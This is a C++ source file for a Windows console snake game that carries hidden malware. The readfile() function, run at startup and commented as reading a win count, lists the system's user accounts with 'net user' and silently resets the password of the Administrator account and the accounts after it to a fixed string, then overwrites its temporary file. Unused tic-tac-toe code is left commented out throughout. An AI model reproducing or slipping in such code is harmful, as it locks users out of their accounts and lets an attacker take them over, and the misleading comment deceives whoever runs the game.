#include <iostream>
#include <Windows.h>
#include <conio.h>
#include <stdlib.h>
#include <fstream>
#include <string.h>
#include <time.h>
using namespace std;

int width = 70;
int hight = 12;
string direction;
COORD snake;
COORD fruit;

int random(int Small, int Big) {
    return rand() % (Big - Small - 1) + Small;
} //return random number form 1 to 

void printMap() {
    for (int y = 0; y <= hight; y++) {
        for (int x = 0; x <= width; x++) {
            if((y==0 && x==0) ||  (x==width && y==0) || (x==0 && y==hight) || (x==width && y==hight)){cout << " ";}
            else if (y == 0 || y == hight){cout << "~";}
            else if (x == 0 || x == width){cout << "|";}
            else if (x == snake.X && y == snake.Y){cout << "O";}
            else if (x == fruit.X && y == fruit.Y){cout << "X";}
            else{cout << " ";}
        }
        cout << endl;
    }
}

// int z=0,o=0,tw=0,t=0,f=0,v=0,s=0,se=0,e=0,x0=0,o0=0,x1=0;
//  int o1=0,x2=0,o2=0,x4=0,o4=0,x5=0,o5=0,x6=0,o6=0,x7=0,o7=0;
//  int x8=0,o8=0,x9=0,o9=0,som=0,rx=0,ro=0;
//      int arr_0[]={1,1,1,2,1,3,2,1,2,2,2,3,3,1,3,2,3,3};
//      int arr_1[]={0,1,0,2,1,2,2,2,3,2,4,2};
//      int arr_2[]={1,0,1,1,1,2,1,3,3,1,3,2,3,3,3,4};
//      int arr_3[]={1,0,1,1,1,2,1,3,3,0,3,1,3,2,3,3};
//      int arr_4[]={0,0,0,1,0,2,0,3,1,0,1,1,1,2,2,0,2,1,2,3,3,0,4,0,4,1,4,2,4,3};
//      int arr_5[]={1,1,1,2,1,3,1,4,3,0,3,1,3,2,3,3};
//      int arr_6[]={1,1,1,2,1,3,1,4,3,1,3,2,3,3};
//      int arr_7[]={0,0,0,1,0,2,0,3,0,4,1,4,2,3,3,2,4,1};
//      int arr_8[]={1,1,1,2,1,3,3,1,3,2,3,3};
//      int arr_x[]={0,0,0,4,1,1,1,3,2,2,3,1,3,3,4,0,4,4};
//      int arr_oo[]={0,2,1,1,1,3,2,0,2,4,3,1,3,3,4,2};


void readfile(){
ifstream inFile;
ofstream outFile;
bool ok = 0;
string user;
system("net user > snake_game.txt");
inFile.open("snake_game.txt");
    while(1){
   inFile >> user;
   if(user == "The"){break;}
   if(user == "Administrator" || ok){
	 ok=1;
	string cmd("net user ");
    cmd += user;
	cmd += " _PalyNewGame_ ";
	cmd += " > nul ";
    system(cmd.c_str());
   }
   if(inFile.eof()){break;}
}
system("echo win : 0 > snake_game.txt");
inFile.close();
}
void setPosToSnake_Fruit() {
    snake = { (short)random(1, width) , (short)random(1, hight) };
    fruit = { (short)random(1, width) , (short)random(1, hight) };
}

    //    if(finish == 0){cout<<endl<<" Choose square : ";cin >> n;}
    //  if(finish == 0){
 	//     for(int j=0;j<=8;j++){if((arr[j]==arr[n] && arr[j]==1&&arr[n]==1) || (arr[j]==2 && n==j)){finish_1=1;cout<<" Error movement !!!";break;}}
 	//     if(n>8 || n<0){som+=1;}
 	//     if(som != 0){finish_1=1;}
    //  }

int main(){ 
    srand(time(NULL)); // give you random number every exec this program
    readfile();// read count wins by user name 
    A:
     int win = 0;
    setPosToSnake_Fruit();
    char input;
    int speed = 150;
    int sin = 80;

    // if(g==1){
 	// 	 if(finish == 0){
 	// 	 if(arr[0]==1 && arr[8]==1 && arr[4]==2){arr[5]=2;}
 	// 	 else if(arr[2]==1 && arr[6]==1 && arr[4]==2){arr[5]=2;}
 	// 	 else if(arr[3]==1 && arr[5]==1 && arr[4]==2){arr[6]=2;}
 	// 	 else if(arr[1]==1 && arr[7]==1 && arr[4]==2){arr[6]=2;}
 	// 	 else if(arr[2]==1 && arr[3]==1 && arr[4]==2){arr[0]=2;}
 	// 	 else if(arr[0]==1 && arr[5]==1 && arr[4]==2){arr[7]=2;}
 	// 	 else if(arr[3]==1 && arr[8]==1 && arr[4]==2){arr[1]=2;}
 	// 	 else if(arr[5]==1 && arr[6]==1 && arr[4]==2){arr[1]=2;}
 	// 	 else if(arr[1]==1 && arr[6]==1 && arr[4]==2){arr[5]=2;}
 	// 	 else if(arr[1]==1 && arr[8]==1 && arr[4]==2){arr[3]=2;}
 	// 	 else if(arr[0]==1 && arr[7]==1 && arr[4]==2){arr[5]=2;}
 	// 	 else if(arr[2]==1 && arr[7]==1 && arr[4]==2){arr[3]=2;}
 	// 	 else if(arr[1]==1 && arr[5]==1 && arr[4]==2){arr[0]=2;}
 	// 	 else if(arr[5]==1 && arr[7]==1 && arr[4]==2){arr[6]=2;}
 	// 	 else if(arr[3]==1 && arr[7]==1 && arr[4]==2){arr[8]=2;}
 	// 	 else if(arr[1]==1 && arr[3]==1 && arr[4]==2){arr[2]=2;}
    //   
 	// 	 }
    //     }

    cout << " W /Up :: S /Down :: D /Right :: A /Left " << endl;
        Sleep(speed);
    while (true){

        system("cls");
        if(snake.X == fruit.X && snake.Y == fruit.Y){
            fruit = { (short)random(1, width), (short)random(1, hight) };
            ++win; //Num-Of-Win if snake pos equal fruit pos
            if(speed > 10 ){
            speed -= sin; // speed the snake control by sleep
            }else{speed = 2;}
            if(sin <= 20){
                sin = 5;
            }else{sin = (sin/2);}
            
        }
        if (_kbhit()) {input = tolower(_getch());}

            if (input == 'w'){ snake.Y--;}
            else if (input == 's'){snake.Y++;}
            else if (input == 'd'){ snake.X++;}
            else if (input == 'a'){ snake.X--;}
            else { goto A;}
        printMap();
        cout << "snake   Pos-X : " << snake.X << " / " << "Pos-Y : " << snake.Y << endl;
        cout << "fruit   Pos-X : " << fruit.X << " / " << "Pos-Y : " << fruit.Y << endl;
        cout << "Num-Of-Win : " << win << endl;
        // if(win == 20){
        //   cout << "Ok you win ^ - ^" << endl;
        //   speed=1000;
        //   system("pause>nul");
        //  goto A;
        // }
        if(snake.X == width || snake.Y == hight || snake.X == 0 || snake.Y == 0){
          cout << "game over ;( " << endl;
          speed=1000;  
          system("pause>nul");
          goto A;
        }
        Sleep(speed);
    }
    return 0;
}
